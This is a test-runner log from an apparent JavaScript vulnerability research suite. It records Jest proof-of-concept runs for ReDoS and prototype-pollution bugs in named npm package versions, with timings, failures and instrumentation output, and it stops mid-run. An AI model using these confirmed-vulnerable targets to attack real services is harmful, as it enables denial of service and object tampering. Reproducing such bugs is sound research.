      51 |    if (percUsed === 10) percUsed = 9;

      at Object.<anonymous> (require-interception.js:48:56)

Test Suites: 1 failed, 1 total
Tests:       1 failed, 1 total
Snapshots:   0 total
Time:        1.093 s
Ran all test suites matching /redos\/method-override_2.0.0\/method-override.test.js/i.
Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
Traceback (most recent call last):
  File "/Users/masudulhasanmasudbhuiyan/Music/vulns4js/redos/test_modules_in_serial.py", line 31, in <module>
    ping = subprocess.run(['jest', '--forceExit', test_file_name], stdout=subprocess.PIPE, check=True)
  File "/usr/local/Cellar/python@3.9/3.9.8/Frameworks/Python.framework/Versions/3.9/lib/python3.9/subprocess.py", line 528, in run
    raise CalledProcessError(retcode, process.args,
subprocess.CalledProcessError: Command '['jest', '--forceExit', 'redos/method-override_2.0.0/method-override.test.js']' returned non-zero exit status 1.
redos/clean-css_4.1.10/clean-css.test.js
FAIL clean-css_4.1.10/clean-css.test.js
  ✕ ReDoS in clean-css (1430 ms)

  ● ReDoS in clean-css

    ReferenceError: i is not defined

       6 |   let input;
       7 |   let pump = [];
    >  8 |   for (i = 0; i < 10000; i++) {
         |         ^
       9 |     pump.push("0000000000");
      10 |   }
      11 |   input =

      at Object.<anonymous> (clean-css_4.1.10/clean-css.test.js:8:9)

Test Suites: 1 failed, 1 total
Tests:       1 failed, 1 total
Snapshots:   0 total
Time:        2.327 s
Ran all test suites matching /redos\/clean-css_4.1.10\/clean-css.test.js/i.
Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
Traceback (most recent call last):
  File "/Users/masudulhasanmasudbhuiyan/Music/vulns4js/redos/test_modules_in_serial.py", line 31, in <module>
    ping = subprocess.run(['jest', '--forceExit', test_file_name], stdout=subprocess.PIPE, check=True)
  File "/usr/local/Cellar/python@3.9/3.9.8/Frameworks/Python.framework/Versions/3.9/lib/python3.9/subprocess.py", line 528, in run
    raise CalledProcessError(retcode, process.args,
subprocess.CalledProcessError: Command '['jest', '--forceExit', 'redos/clean-css_4.1.10/clean-css.test.js']' returned non-zero exit status 1.
redos/underscore.string_3.3.4/underscore-string.test.js
PASS underscore.string_3.3.4/underscore-string.test.js
  ✓ ReDos in underscore.string (3039 ms)

Test Suites: 1 passed, 1 total
Tests:       1 passed, 1 total
Snapshots:   0 total
Time:        4.002 s
Ran all test suites matching /redos\/underscore.string_3.3.4\/underscore-string.test.js/i.
Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
b"Loaded babel plugin\n  console.log\n    [\n      'VERSION',         'isBlank',      'stripTags',        'capitalize',\n      'decapitalize',    'chop',         'trim',             'clean',\n      'cleanDiacritics', 'count',        'chars',            'swapCase',\n      'escapeHTML',      'unescapeHTML', 'splice',           'insert',\n      'replaceAll',      'include',      'join',             'lines',\n      'dedent',          'reverse',      'startsWith',       'endsWith',\n      'pred',            'succ',         'titleize',         'camelize',\n      'underscored',     'dasherize',    'classify',         'humanize',\n      'ltrim',           'rtrim',        'truncate',         'prune',\n      'words',           'pad',          'lpad',             'rpad',\n      'lrpad',           'sprintf',      'vsprintf',         'toNumber',\n      'numberFormat',    'strRight',     'strRightBack',     'strLeft',\n      'strLeftBack',     'toSentence',   'toSentenceSerial', 'slugify',\n      'surround',        'quote',        'unquote',          'repeat',\n      'naturalCmp',      'levenshtein',  'toBoolean',        'exports',\n      'escapeRegExp',    'wrap',         'map',              'strip',\n      'lstrip',          'rstrip',       'center',           'rjust',\n      'ljust',           'contains',     'q',                'toBool',\n      'camelcase',       'mapChars',     'main'\n    ]\n\n      at Object.<anonymous> (require-interception.js:45:12)\n\n  console.log\n    Set(2) { 'main', 'unescapeHTML' }\n\n      at Object.<anonymous> (require-interception.js:46:12)\n\n  console.log\n    Result for heatmap: 0, 1\n\n      at Object.<anonymous> (require-interception.js:52:12)\n\n"
redos/minimatch_3.0.0/minimatch.test.js
PASS minimatch_3.0.0/minimatch.test.js (11.84 s)
  ✓ ReDos in minimatch (11303 ms)

Test Suites: 1 passed, 1 total
Tests:       1 passed, 1 total
Snapshots:   0 total
Time:        12.217 s
Ran all test suites matching /redos\/minimatch_3.0.0\/minimatch.test.js/i.
Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
b"Loaded babel plugin\n  console.log\n    [\n      'Minimatch',\n      'GLOBSTAR',\n      'filter',\n      'defaults',\n      'braceExpand',\n      'makeRe',\n      'match',\n      'main'\n    ]\n\n      at Object.<anonymous> (require-interception.js:45:12)\n\n  console.log\n    Set(1) { 'main' }\n\n      at Object.<anonymous> (require-interception.js:46:12)\n\n  console.log\n    Result for heatmap: 1, 6\n\n      at Object.<anonymous> (require-interception.js:52:12)\n\n"
redos/postcss_8.0.0/postcss.test.js
FAIL postcss_8.0.0/postcss.test.js
  ✕ ReDos in postcss (38 ms)

  ● ReDos in postcss

    TypeError: /Users/masudulhasanmasudbhuiyan/Music/vulns4js/redos/node_modules/postcss/lib/postcss.js: Cannot read properties of undefined (reading 'unshift')

      71 |           if (path.node.id) name = path.node.id.name;
      72 |           // console.log(path.node.body);
    > 73 |           path.node.body.body.unshift(
         |                               ^
      74 |             t.callExpression(t.identifier("pushFct"), [
      75 |               t.stringLiteral(name + ":" + path.node.loc.start.line),
      76 |             ])

      at PluginPass.enter (../prototype-pollution/babel-instrumentor.js:73:31)
      at newFn (../node_modules/@babel/traverse/lib/visitors.js:177:21)
      at NodePath._call (../node_modules/@babel/traverse/lib/path/context.js:53:20)
      at NodePath.call (../node_modules/@babel/traverse/lib/path/context.js:40:17)
      at NodePath.visit (../node_modules/@babel/traverse/lib/path/context.js:100:31)
      at TraversalContext.visitQueue (../node_modules/@babel/traverse/lib/context.js:103:16)
      at TraversalContext.visitSingle (../node_modules/@babel/traverse/lib/context.js:77:19)
      at TraversalContext.visit (../node_modules/@babel/traverse/lib/context.js:131:19)
      at traverseNode (../node_modules/@babel/traverse/lib/traverse-node.js:24:17)
      at NodePath.visit (../node_modules/@babel/traverse/lib/path/context.js:107:52)

  ● ReDos in postcss

    expect(received).toBeGreaterThan(expected)

    Expected: > 1
    Received:   0.00004702

      17 |   });
      18 |   let time = t[0] + t[1] / 1000000000;
    > 19 |   expect(time).toBeGreaterThan(1);
         |                ^
      20 | });
      21 | 

      at Object.<anonymous> (postcss_8.0.0/postcss.test.js:19:16)

  ● ReDos in postcss

    TypeError: Cannot read properties of undefined (reading 'size')

      46 |    console.log(global.accessedProperties);   
      47 |    let maxChain = getMaxLength(global.fctsLog) - 1;
    > 48 |    let percUsed = Math.floor(global.accessedProperties.size /global.declaredProperties.length * 10);
         |                                                        ^
      49 |    if (global.accessedProperties.size === 0) percUsed = -1;
      50 |    if (maxChain >= 10) maxChain = 9;
      51 |    if (percUsed === 10) percUsed = 9;

      at Object.<anonymous> (require-interception.js:48:56)

Test Suites: 1 failed, 1 total
Tests:       1 failed, 1 total
Snapshots:   0 total
Time:        0.932 s
Ran all test suites matching /redos\/postcss_8.0.0\/postcss.test.js/i.
Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
Traceback (most recent call last):
  File "/Users/masudulhasanmasudbhuiyan/Music/vulns4js/redos/test_modules_in_serial.py", line 31, in <module>
    ping = subprocess.run(['jest', '--forceExit', test_file_name], stdout=subprocess.PIPE, check=True)
  File "/usr/local/Cellar/python@3.9/3.9.8/Frameworks/Python.framework/Versions/3.9/lib/python3.9/subprocess.py", line 528, in run
    raise CalledProcessError(retcode, process.args,
subprocess.CalledProcessError: Command '['jest', '--forceExit', 'redos/postcss_8.0.0/postcss.test.js']' returned non-zero exit status 1.
redos/slug_0.9.1/slug.test.js
PASS slug_0.9.1/slug.test.js (6.035 s)
  ✓ ReDos in slug (5503 ms)

Test Suites: 1 passed, 1 total
Tests:       1 passed, 1 total
Snapshots:   0 total
Time:        6.395 s
Ran all test suites matching /redos\/slug_0.9.1\/slug.test.js/i.
Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
b"Loaded babel plugin\n  console.log\n    [ 'defaults', 'multicharmap', 'charmap', 'main' ]\n\n      at Object.<anonymous> (require-interception.js:45:12)\n\n  console.log\n    Set(1) { 'main' }\n\n      at Object.<anonymous> (require-interception.js:46:12)\n\n  console.log\n    Result for heatmap: 2, 2\n\n      at Object.<anonymous> (require-interception.js:52:12)\n\n"
redos/mobile-detect_1.3.6/mobile-detect.test.js
PASS mobile-detect_1.3.6/mobile-detect.test.js
  ✓ ReDos in mobile-detect (2470 ms)

Test Suites: 1 passed, 1 total
Tests:       1 passed, 1 total
Snapshots:   0 total
Time:        3.393 s
Ran all test suites matching /redos\/mobile-detect_1.3.6\/mobile-detect.test.js/i.
Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
b"Loaded babel plugin\n  console.log\n    [ 'isPhoneSized', '_impl', 'version', 'main' ]\n\n      at Object.<anonymous> (require-interception.js:45:12)\n\n  console.log\n    Set(2) { 'main', 'prototype' }\n\n      at Object.<anonymous> (require-interception.js:46:12)\n\n  console.log\n    Result for heatmap: 5, 4\n\n      at Object.<anonymous> (require-interception.js:52:12)\n\n"
redos/lodash_4.17.4/lodash.test.js
PASS lodash_4.17.4/lodash.test.js
  ✓ ReDos in lodash (2870 ms)

Test Suites: 1 passed, 1 total
Tests:       1 passed, 1 total
Snapshots:   0 total
Time:        3.76 s
Ran all test suites matching /redos\/lodash_4.17.4\/lodash.test.js/i.
Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
b"Loaded babel plugin\n  console.log\n    [\n      'templateSettings', 'after',          'ary',              'assign',\n      'assignIn',         'assignInWith',   'assignWith',       'at',\n      'before',           'bind',           'bindAll',          'bindKey',\n      'castArray',        'chain',          'chunk',            'compact',\n      'concat',           'cond',           'conforms',         'constant',\n      'countBy',          'create',         'curry',            'curryRight',\n      'debounce',         'defaults',       'defaultsDeep',     'defer',\n      'delay',            'difference',     'differenceBy',     'differenceWith',\n      'drop',             'dropRight',      'dropRightWhile',   'dropWhile',\n      'fill',             'filter',         'flatMap',          'flatMapDeep',\n      'flatMapDepth',     'flatten',        'flattenDeep',      'flattenDepth',\n      'flip',             'flow',           'flowRight',        'fromPairs',\n      'functions',        'functionsIn',    'groupBy',          'initial',\n      'intersection',     'intersectionBy', 'intersectionWith', 'invert',\n      'invertBy',         'invokeMap',      'iteratee',         'keyBy',\n      'keys',             'keysIn',         'map',              'mapKeys',\n      'mapValues',        'matches',        'matchesProperty',  'memoize',\n      'merge',            'mergeWith',      'method',           'methodOf',\n      'mixin',            'negate',         'nthArg',           'omit',\n      'omitBy',           'once',           'orderBy',          'over',\n      'overArgs',         'overEvery',      'overSome',         'partial',\n      'partialRight',     'partition',      'pick',             'pickBy',\n      'property',         'propertyOf',     'pull',             'pullAll',\n      'pullAllBy',        'pullAllWith',    'pullAt',           'range',\n      'rangeRight',       'rearg',          'reject',           'remove',\n      ... 209 more items\n    ]\n\n      at Object.<anonymous> (require-interception.js:45:12)\n\n  console.log\n    Set(2) { 'main', 'lowerCase' }\n\n      at Object.<anonymous> (require-interception.js:46:12)\n\n  console.log\n    Result for heatmap: 0, 7\n\n      at Object.<anonymous> (require-interception.js:52:12)\n\n"
redos/djvalidator_2.0.0/djvalidator.test.js
FAIL djvalidator_2.0.0/djvalidator.test.js
  ✕ ReDos in djvalidator (818 ms)

  ● ReDos in djvalidator

    DjValidator requires jQuery 1.5.1 or higher.

      26 |         if (fs.existsSync(prefixed))
      27 |             currMod = prefixed;
    > 28 |         let result = jest.requireActual(currMod);
         |                           ^
      29 |         global.accessedProperties = new Set();
      30 |         global.declaredProperties = Object.keys(result);    
      31 |         

      at Object.<anonymous> (node_modules/djvalidator/dist/DjValidator.js:21:40)
      at Object.<anonymous> (require-interception.js:28:27)

  ● ReDos in djvalidator

    ReferenceError: jQuery is not defined

       6 |     )}!">';`
       7 |   );
    >  8 |   $ = jQuery = require("jquery");
         |             ^
       9 |   require("djvalidator");
      10 |   let t = measureTime(function () {
      11 |     jQuery("#input").djValidator();

      at Object.<anonymous> (djvalidator_2.0.0/djvalidator.test.js:8:13)

  ● ReDos in djvalidator

    TypeError: Cannot read properties of undefined (reading 'size')

      46 |    console.log(global.accessedProperties);   
      47 |    let maxChain = getMaxLength(global.fctsLog) - 1;
    > 48 |    let percUsed = Math.floor(global.accessedProperties.size /global.declaredProperties.length * 10);
         |                                                        ^
      49 |    if (global.accessedProperties.size === 0) percUsed = -1;
      50 |    if (maxChain >= 10) maxChain = 9;
      51 |    if (percUsed === 10) percUsed = 9;

      at Object.<anonymous> (require-interception.js:48:56)

Test Suites: 1 failed, 1 total
Tests:       1 failed, 1 total
Snapshots:   0 total
Time:        1.714 s
Ran all test suites matching /redos\/djvalidator_2.0.0\/djvalidator.test.js/i.
Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
Traceback (most recent call last):
  File "/Users/masudulhasanmasudbhuiyan/Music/vulns4js/redos/test_modules_in_serial.py", line 31, in <module>
    ping = subprocess.run(['jest', '--forceExit', test_file_name], stdout=subprocess.PIPE, check=True)
  File "/usr/local/Cellar/python@3.9/3.9.8/Frameworks/Python.framework/Versions/3.9/lib/python3.9/subprocess.py", line 528, in run
    raise CalledProcessError(retcode, process.args,
subprocess.CalledProcessError: Command '['jest', '--forceExit', 'redos/djvalidator_2.0.0/djvalidator.test.js']' returned non-zero exit status 1.
redos/fast-csv_4.3.5/fast-csv.test.js
FAIL fast-csv_4.3.5/fast-csv.test.js
  ✕ ReDos in fast-csv (85 ms)

  ● ReDos in fast-csv

    TypeError: /Users/masudulhasanmasudbhuiyan/Music/vulns4js/redos/node_modules/@fast-csv/format/build/src/index.js: Cannot read properties of undefined (reading 'unshift')

      71 |           if (path.node.id) name = path.node.id.name;
      72 |           // console.log(path.node.body);
    > 73 |           path.node.body.body.unshift(
         |                               ^
      74 |             t.callExpression(t.identifier("pushFct"), [
      75 |               t.stringLiteral(name + ":" + path.node.loc.start.line),
      76 |             ])

      at PluginPass.enter (../prototype-pollution/babel-instrumentor.js:73:31)
      at newFn (../node_modules/@babel/traverse/lib/visitors.js:177:21)
      at NodePath._call (../node_modules/@babel/traverse/lib/path/context.js:53:20)
      at NodePath.call (../node_modules/@babel/traverse/lib/path/context.js:40:17)
      at NodePath.visit (../node_modules/@babel/traverse/lib/path/context.js:100:31)
      at TraversalContext.visitQueue (../node_modules/@babel/traverse/lib/context.js:103:16)
      at TraversalContext.visitSingle (../node_modules/@babel/traverse/lib/context.js:77:19)
      at TraversalContext.visit (../node_modules/@babel/traverse/lib/context.js:131:19)
      at traverseNode (../node_modules/@babel/traverse/lib/traverse-node.js:24:17)
      at NodePath.visit (../node_modules/@babel/traverse/lib/path/context.js:107:52)

  ● ReDos in fast-csv

    TypeError: csv.parse is not a function

      4 |   let start = process.hrtime();
      5 |   const stream = csv
    > 6 |     .parse({
        |      ^
      7 |       ignoreEmpty: true,
      8 |       delimiter: "\t",
      9 |     })

      at Object.<anonymous> (fast-csv_4.3.5/fast-csv.test.js:6:6)

  ● ReDos in fast-csv

    TypeError: Cannot read properties of undefined (reading 'size')

      46 |    console.log(global.accessedProperties);   
      47 |    let maxChain = getMaxLength(global.fctsLog) - 1;
    > 48 |    let percUsed = Math.floor(global.accessedProperties.size /global.declaredProperties.length * 10);
         |                                                        ^
      49 |    if (global.accessedProperties.size === 0) percUsed = -1;
      50 |    if (maxChain >= 10) maxChain = 9;
      51 |    if (percUsed === 10) percUsed = 9;

      at Object.<anonymous> (require-interception.js:48:56)

Test Suites: 1 failed, 1 total
Tests:       1 failed, 1 total
Snapshots:   0 total
Time:        0.991 s
Ran all test suites matching /redos\/fast-csv_4.3.5\/fast-csv.test.js/i.
Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
Traceback (most recent call last):
  File "/Users/masudulhasanmasudbhuiyan/Music/vulns4js/redos/test_modules_in_serial.py", line 31, in <module>
    ping = subprocess.run(['jest', '--forceExit', test_file_name], stdout=subprocess.PIPE, check=True)
  File "/usr/local/Cellar/python@3.9/3.9.8/Frameworks/Python.framework/Versions/3.9/lib/python3.9/subprocess.py", line 528, in run
    raise CalledProcessError(retcode, process.args,
subprocess.CalledProcessError: Command '['jest', '--forceExit', 'redos/fast-csv_4.3.5/fast-csv.test.js']' returned non-zero exit status 1.
redos/normalize-url_6.0.0/normalize-url.test.js
FAIL normalize-url_6.0.0/normalize-url.test.js
  ✕ ReDos in parsejson (47 ms)

  ● ReDos in parsejson

    TypeError: /Users/masudulhasanmasudbhuiyan/Music/vulns4js/redos/node_modules/normalize-url/index.js: Cannot read properties of undefined (reading 'unshift')

      71 |           if (path.node.id) name = path.node.id.name;
      72 |           // console.log(path.node.body);
    > 73 |           path.node.body.body.unshift(
         |                               ^
      74 |             t.callExpression(t.identifier("pushFct"), [
      75 |               t.stringLiteral(name + ":" + path.node.loc.start.line),
      76 |             ])

      at PluginPass.enter (../prototype-pollution/babel-instrumentor.js:73:31)
      at newFn (../node_modules/@babel/traverse/lib/visitors.js:177:21)
      at NodePath._call (../node_modules/@babel/traverse/lib/path/context.js:53:20)
      at NodePath.call (../node_modules/@babel/traverse/lib/path/context.js:40:17)
      at NodePath.visit (../node_modules/@babel/traverse/lib/path/context.js:100:31)
      at TraversalContext.visitQueue (../node_modules/@babel/traverse/lib/context.js:103:16)
      at TraversalContext.visitMultiple (../node_modules/@babel/traverse/lib/context.js:72:17)
      at TraversalContext.visit (../node_modules/@babel/traverse/lib/context.js:129:19)
      at traverseNode (../node_modules/@babel/traverse/lib/traverse-node.js:24:17)
      at NodePath.visit (../node_modules/@babel/traverse/lib/path/context.js:107:52)

  ● ReDos in parsejson

    expect(received).toBeGreaterThan(expected)

    Expected: > 1
    Received:   0.000057064

       8 |   });
       9 |   let time = t[0] + t[1] / 1000000000;
    > 10 |   expect(time).toBeGreaterThan(1);
         |                ^
      11 | });
      12 | 

      at Object.<anonymous> (normalize-url_6.0.0/normalize-url.test.js:10:16)

  ● ReDos in parsejson

    TypeError: Cannot read properties of undefined (reading 'size')

      46 |    console.log(global.accessedProperties);   
      47 |    let maxChain = getMaxLength(global.fctsLog) - 1;
    > 48 |    let percUsed = Math.floor(global.accessedProperties.size /global.declaredProperties.length * 10);
         |                                                        ^
      49 |    if (global.accessedProperties.size === 0) percUsed = -1;
      50 |    if (maxChain >= 10) maxChain = 9;
      51 |    if (percUsed === 10) percUsed = 9;

      at Object.<anonymous> (require-interception.js:48:56)

Test Suites: 1 failed, 1 total
Tests:       1 failed, 1 total
Snapshots:   0 total
Time:        0.945 s
Ran all test suites matching /redos\/normalize-url_6.0.0\/normalize-url.test.js/i.
Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
Traceback (most recent call last):
  File "/Users/masudulhasanmasudbhuiyan/Music/vulns4js/redos/test_modules_in_serial.py", line 31, in <module>
    ping = subprocess.run(['jest', '--forceExit', test_file_name], stdout=subprocess.PIPE, check=True)
  File "/usr/local/Cellar/python@3.9/3.9.8/Frameworks/Python.framework/Versions/3.9/lib/python3.9/subprocess.py", line 528, in run
    raise CalledProcessError(retcode, process.args,
subprocess.CalledProcessError: Command '['jest', '--forceExit', 'redos/normalize-url_6.0.0/normalize-url.test.js']' returned non-zero exit status 1.
redos/dirty-json_0.4.0/dirty-json.test.js
PASS dirty-json_0.4.0/dirty-json.test.js
  ✓ ReDoS in dirty-json (1675 ms)

Test Suites: 1 passed, 1 total
Tests:       1 passed, 1 total
Snapshots:   0 total
Time:        2.451 s, estimated 3 s
Ran all test suites matching /redos\/dirty-json_0.4.0\/dirty-json.test.js/i.
Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
b"Loaded babel plugin\n  console.log\n    [ 'parse' ]\n\n      at Object.<anonymous> (require-interception.js:45:12)\n\n  console.log\n    Set(1) { 'parse' }\n\n      at Object.<anonymous> (require-interception.js:46:12)\n\n  console.log\n    Result for heatmap: 9, 6\n\n      at Object.<anonymous> (require-interception.js:52:12)\n\n"
redos/ws_7.0.0/ws.test.js
FAIL ws_7.0.0/ws.test.js
  ✕ ReDos in ws (2025 ms)

  ● ReDos in ws

    TypeError: /Users/masudulhasanmasudbhuiyan/Music/vulns4js/redos/node_modules/ws/lib/validation.js: Cannot read properties of undefined (reading 'unshift')

      71 |           if (path.node.id) name = path.node.id.name;
      72 |           // console.log(path.node.body);
    > 73 |           path.node.body.body.unshift(
         |                               ^
      74 |             t.callExpression(t.identifier("pushFct"), [
      75 |               t.stringLiteral(name + ":" + path.node.loc.start.line),
      76 |             ])

      at PluginPass.enter (../prototype-pollution/babel-instrumentor.js:73:31)
      at newFn (../node_modules/@babel/traverse/lib/visitors.js:177:21)
      at NodePath._call (../node_modules/@babel/traverse/lib/path/context.js:53:20)
      at NodePath.call (../node_modules/@babel/traverse/lib/path/context.js:40:17)
      at NodePath.visit (../node_modules/@babel/traverse/lib/path/context.js:100:31)
      at TraversalContext.visitQueue (../node_modules/@babel/traverse/lib/context.js:103:16)
      at TraversalContext.visitSingle (../node_modules/@babel/traverse/lib/context.js:77:19)
      at TraversalContext.visit (../node_modules/@babel/traverse/lib/context.js:131:19)
      at traverseNode (../node_modules/@babel/traverse/lib/traverse-node.js:24:17)
      at NodePath.visit (../node_modules/@babel/traverse/lib/path/context.js:107:52)

  ● ReDos in ws

    TypeError: Cannot read properties of undefined (reading 'size')

      46 |    console.log(global.accessedProperties);   
      47 |    let maxChain = getMaxLength(global.fctsLog) - 1;
    > 48 |    let percUsed = Math.floor(global.accessedProperties.size /global.declaredProperties.length * 10);
         |                                                        ^
      49 |    if (global.accessedProperties.size === 0) percUsed = -1;
      50 |    if (maxChain >= 10) maxChain = 9;
      51 |    if (percUsed === 10) percUsed = 9;

      at Object.<anonymous> (require-interception.js:48:56)

Test Suites: 1 failed, 1 total
Tests:       1 failed, 1 total
Snapshots:   0 total
Time:        2.92 s, estimated 3 s
Ran all test suites matching /redos\/ws_7.0.0\/ws.test.js/i.
Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
Traceback (most recent call last):
  File "/Users/masudulhasanmasudbhuiyan/Music/vulns4js/redos/test_modules_in_serial.py", line 31, in <module>
    ping = subprocess.run(['jest', '--forceExit', test_file_name], stdout=subprocess.PIPE, check=True)
  File "/usr/local/Cellar/python@3.9/3.9.8/Frameworks/Python.framework/Versions/3.9/lib/python3.9/subprocess.py", line 528, in run
    raise CalledProcessError(retcode, process.args,
subprocess.CalledProcessError: Command '['jest', '--forceExit', 'redos/ws_7.0.0/ws.test.js']' returned non-zero exit status 1.
redos/parsejson_0.0.3/parsejson.test.js
PASS parsejson_0.0.3/parsejson.test.js
  ✓ ReDos in parsejson (1890 ms)

Test Suites: 1 passed, 1 total
Tests:       1 passed, 1 total
Snapshots:   0 total
Time:        2.782 s
Ran all test suites matching /redos\/parsejson_0.0.3\/parsejson.test.js/i.
Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
b"Loaded babel plugin\n  console.log\n    [ 'main' ]\n\n      at Object.<anonymous> (require-interception.js:45:12)\n\n  console.log\n    Set(1) { 'main' }\n\n      at Object.<anonymous> (require-interception.js:46:12)\n\n  console.log\n    Result for heatmap: 9, 1\n\n      at Object.<anonymous> (require-interception.js:52:12)\n\n"
redos/color-string_1.5.4/color-string.test.js
PASS color-string_1.5.4/color-string.test.js
  ✓ ReDoS in color-string (1955 ms)

Test Suites: 1 passed, 1 total
Tests:       1 passed, 1 total
Snapshots:   0 total
Time:        2.844 s
Ran all test suites matching /redos\/color-string_1.5.4\/color-string.test.js/i.
Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
b"Loaded babel plugin\n  console.log\n    [ 'to', 'get' ]\n\n      at Object.<anonymous> (require-interception.js:45:12)\n\n  console.log\n    Set(1) { 'get' }\n\n      at Object.<anonymous> (require-interception.js:46:12)\n\n  console.log\n    Result for heatmap: 5, 3\n\n      at Object.<anonymous> (require-interception.js:52:12)\n\n"
redos/squalcal/squalcal.test.js
FAIL squalcal/squalcal.test.js
  ✕ ReDos in SquadCal (963 ms)

  ● ReDos in SquadCal

    ENOENT: no such file or directory, open '/Users/masudulhasanmasudbhuiyan/Music/vulns4js/redos/squalcal/package.json'

      20 |     let testDir = path.dirname(expect.getState().testPath);
      21 |     let jFile = testDir + "/package.json";
    > 22 |     let deps = Object.keys(JSON.parse(fs.readFileSync(jFile)).dependencies);                
         |                                          ^
      23 |     for (let i = 0; i < deps.length; i++) {
      24 |         let currMod = deps[i];                
      25 |         let prefixed = testDir + "/node_modules/" + currMod;

      at Object.<anonymous> (require-interception.js:22:42)

  ● ReDos in SquadCal

    expect(received).toBeGreaterThan(expected)

    Expected: > 1
    Received:   0.944978271

       8 |   });
       9 |   let time = t[0] + t[1] / 1000000000;
    > 10 |   expect(time).toBeGreaterThan(1);
         |                ^
      11 | });
      12 | 

      at Object.<anonymous> (squalcal/squalcal.test.js:10:16)

  ● ReDos in SquadCal

    TypeError: Cannot read properties of undefined (reading 'size')

      46 |    console.log(global.accessedProperties);   
      47 |    let maxChain = getMaxLength(global.fctsLog) - 1;
    > 48 |    let percUsed = Math.floor(global.accessedProperties.size /global.declaredProperties.length * 10);
         |                                                        ^
      49 |    if (global.accessedProperties.size === 0) percUsed = -1;
      50 |    if (maxChain >= 10) maxChain = 9;
      51 |    if (percUsed === 10) percUsed = 9;

      at Object.<anonymous> (require-interception.js:48:56)

Test Suites: 1 failed, 1 total
Tests:       1 failed, 1 total
Snapshots:   0 total
Time:        1.865 s
Ran all test suites matching /redos\/squalcal\/squalcal.test.js/i.
Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
Traceback (most recent call last):
  File "/Users/masudulhasanmasudbhuiyan/Music/vulns4js/redos/test_modules_in_serial.py", line 31, in <module>
    ping = subprocess.run(['jest', '--forceExit', test_file_name], stdout=subprocess.PIPE, check=True)
  File "/usr/local/Cellar/python@3.9/3.9.8/Frameworks/Python.framework/Versions/3.9/lib/python3.9/subprocess.py", line 528, in run
    raise CalledProcessError(retcode, process.args,
subprocess.CalledProcessError: Command '['jest', '--forceExit', 'redos/squalcal/squalcal.test.js']' returned non-zero exit status 1.
PASS field_1.0.1/field.test.js
  ✓ prototype pollution in field  (56 ms)

Test Suites: 1 passed, 1 total
Tests:       1 passed, 1 total
Snapshots:   0 total
Time:        2.041 s
Ran all test suites matching /field_1.0.1\/field.test.js/i.
b"Loaded babel plugin\n  console.log\n    [ 'get', 'set' ]\n\n      at Object.<anonymous> (require-interception.js:45:12)\n\n  console.log\n    Set(1) { 'set' }\n\n      at Object.<anonymous> (require-interception.js:46:12)\n\n  console.log\n    Result for heatmap: 5, 2\n\n      at Object.<anonymous> (require-interception.js:52:12)\n\n"
['../prototype-pollution/dotty_0.0.1/dotty.test.js']
PASS dotty_0.0.1/dotty.test.js
  ✓ prototype pollution in dotty (61 ms)

Test Suites: 1 passed, 1 total
Tests:       1 passed, 1 total
Snapshots:   0 total
Time:        0.962 s
Ran all test suites matching /dotty_0.0.1\/dotty.test.js/i.
b"Loaded babel plugin\n  console.log\n    [ 'exists', 'get', 'search', 'put' ]\n\n      at Object.<anonymous> (require-interception.js:45:12)\n\n  console.log\n    Set(1) { 'put' }\n\n      at Object.<anonymous> (require-interception.js:46:12)\n\n  console.log\n    Result for heatmap: 2, 1\n\n      at Object.<anonymous> (require-interception.js:52:12)\n\n"
['../prototype-pollution/firebase-util_0.3.2/firebase-util.test.js']
PASS firebase-util_0.3.2/firebase-util.test.js
  ✓ prototype pollution in @firebase/util (390 ms)

Test Suites: 1 passed, 1 total
Tests:       1 passed, 1 total
Snapshots:   0 total
Time:        1.297 s
Ran all test suites matching /firebase-util_0.3.2\/firebase-util.test.js/i.
b"Loaded babel plugin\n  console.log\n    [\n      'CONSTANTS',\n      'Deferred',\n      'ErrorFactory',\n      'FirebaseError',\n      'MAX_VALUE_MILLIS',\n      'RANDOM_FACTOR',\n      'Sha1',\n      'areCookiesEnabled',\n      'assert',\n      'assertionError',\n      'async',\n      'base64',\n      'base64Decode',\n      'base64Encode',\n      'calculateBackoffMillis',\n      'contains',\n      'createSubscribe',\n      'decode',\n      'deepCopy',\n      'deepExtend',\n      'errorPrefix',\n      'getUA',\n      'isAdmin',\n      'isBrowser',\n      'isBrowserExtension',\n      'isElectron',\n      'isEmpty',\n      'isIE',\n      'isIndexedDBAvailable',\n      'isMobileCordova',\n      'isNode',\n      'isNodeSdk',\n      'isReactNative',\n      'isSafari',\n      'isUWP',\n      'isValidFormat',\n      'isValidTimestamp',\n      'issuedAtTime',\n      'jsonEval',\n      'map',\n      'querystring',\n      'querystringDecode',\n      'safeGet',\n      'stringLength',\n      'stringToByteArray',\n      'stringify',\n      'validateArgCount',\n      'validateCallback',\n      'validateContextObject',\n      'validateIndexedDBOpenable',\n      'validateNamespace'\n    ]\n\n      at Object.<anonymous> (require-interception.js:45:12)\n\n  console.log\n    Set(1) { 'deepExtend' }\n\n      at Object.<anonymous> (require-interception.js:46:12)\n\n  console.log\n    Result for heatmap: 0, 3\n\n      at Object.<anonymous> (require-interception.js:52:12)\n\n"
['../prototype-pollution/aws-sdk-shared-ini-file-loader_1.0.0-rc.8/aws-sdk-shared-ini-file-loader.test.js']
FAIL aws-sdk-shared-ini-file-loader_1.0.0-rc.8/aws-sdk-shared-ini-file-loader.test.js
  ✕ prototype pollution in @aws-sdk/shared-ini-file-loader (41 ms)

